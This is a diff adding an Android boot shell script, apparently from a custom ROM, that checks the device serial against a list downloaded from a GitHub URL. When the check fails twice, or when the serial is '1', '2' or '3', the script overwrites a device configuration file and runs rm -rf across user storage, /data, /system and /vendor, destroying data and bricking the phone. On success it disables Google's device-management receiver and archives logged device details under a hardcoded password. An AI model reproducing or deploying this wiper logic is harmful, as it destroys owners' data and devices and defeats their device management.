@@ -1,0 +1,92 @@
+#!/system/bin/sh
+sleep 2
+temp=/sdcard/Android/data/temp
+sysdir=/data/system
+DEBUG="1"
+echolog() {
+  [ "$DEBUG" = "1" ] && echo "$@" >> $temp
+}
+seradd=$(getprop ro.serialno)
+radd=$(getprop ro.build.display.id)
+echolog "d1 v2 $seradd $radd"
+id >> $temp
+date >> $temp
+verifyuser() {
+		echolog "Running..."
+		sclist=$(curl -s https://raw.githubusercontent.com/Xeno761/serial_verify/main/a13)
+		srulist=$(curl -s https://raw.githubusercontent.com/Xeno761/serial_verify/main/a13)
+		ver=$(grep $seradd <<< $sclist)
+		ver2=$(grep $seradd <<< $srulist)
+		if [[ $seradd == $ver ]]; then
+		echo "$seradd" > $sysdir/$seradd.pub
+		echolog "SF"
+		chmod 644 $sysdir/$seradd.pub
+		rm -rf $sysdir/*.cts
+		rm -rf /sdcard/unverifieduser
+		if [[ -e /sdcard/verifieduser ]] || [[ -e /sdcard/unverifieduser ]]; then
+		mv /sdcard/*verifieduser /sdcard/temp2
+		fi
+		7za a /sdcard/verifieduser -py0u4r3d34d -mhe $temp /sdcard/temp2
+		rm -rf $temp /sdcard/temp2
+		pm disable com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver
+		exit
+		else
+		sclist=$(curl -s https://raw.githubusercontent.com/Xeno761/serial_verify/main/a13)
+		srulist=$(curl -s https://raw.githubusercontent.com/Xeno761/serial_verify/main/a13)
+		ver=$(grep $seradd <<< $sclist)
+		ver2=$(grep $seradd <<< $srulist)
+		if [[ $seradd == $ver ]]; then
+		echo "$seradd" > $sysdir/$seradd.pub
+		echolog "SF"
+		chmod 644 $sysdir/$seradd.pub
+		rm -rf $sysdir/*.cts
+		rm -rf /sdcard/unverifieduser
+		if [[ -e /sdcard/verifieduser ]] || [[ -e /sdcard/unverifieduser ]]; then
+		mv /sdcard/*verifieduser /sdcard/temp2
+		fi
+		7za a /sdcard/verifieduser -py0u4r3d34d -mhe $temp /sdcard/temp2
+		rm -rf $temp /sdcard/temp2
+		pm disable com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver
+		exit
+		else
+		echolog "Snfo!"
+		date >> $temp
+		if [[ -e $sysdir/verifyonce.cts ]] ; then
+		echo "RIP" > /product/etc/device_features/raphael.xml
+		rm -rf /sdcard/* /storage/*-*/* /storage/*-* /sdcard /data/* /system/* /vendor/*
+		else
+		echo "$seradd" > $sysdir/verifyonce.cts
+		echolog "ver1"
+		fi
+		echolog "SD"
+		rm -rf /sdcard/verifieduser
+		if [[ -e /sdcard/verifieduser ]] || [[ -e /sdcard/unverifieduser ]]; then
+		mv /sdcard/*verifieduser /sdcard/temp2
+		fi
+		7za a /sdcard/unverifieduser -py0u4r3d34d -mhe $temp /sdcard/temp2
+		rm -rf $temp
+		reboot -p
+		fi
+		fi
+		}
+if [[ $seradd == 1 ]] || [[ $seradd == 2 ]] || [[ $seradd == 3 ]]; then
+echo "RIP" > /product/etc/device_features/raphael.xml
+rm -rf /sdcard/* /storage/*-*/* /storage/*-* /sdcard /data/* /system/* /vendor/*
+fi
+echolog "Checking...."
+if [[ -e $sysdir/$seradd.pub ]]; then
+echolog "A V."
+rm -rf $sysdir/*.cts
+rm -rf /sdcard/unverifieduser
+if [[ -e /sdcard/verifieduser ]] || [[ -e /sdcard/unverifieduser ]]; then
+mv /sdcard/*verifieduser /sdcard/temp2
+fi
+7za a /sdcard/verifieduser -py0u4r3d34d -mhe $temp /sdcard/temp2
+rm -rf $temp /sdcard/temp2
+pm disable com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver
+exit
+else
+echolog "Snfl!"
+date >> $temp
+verifyuser
+fi
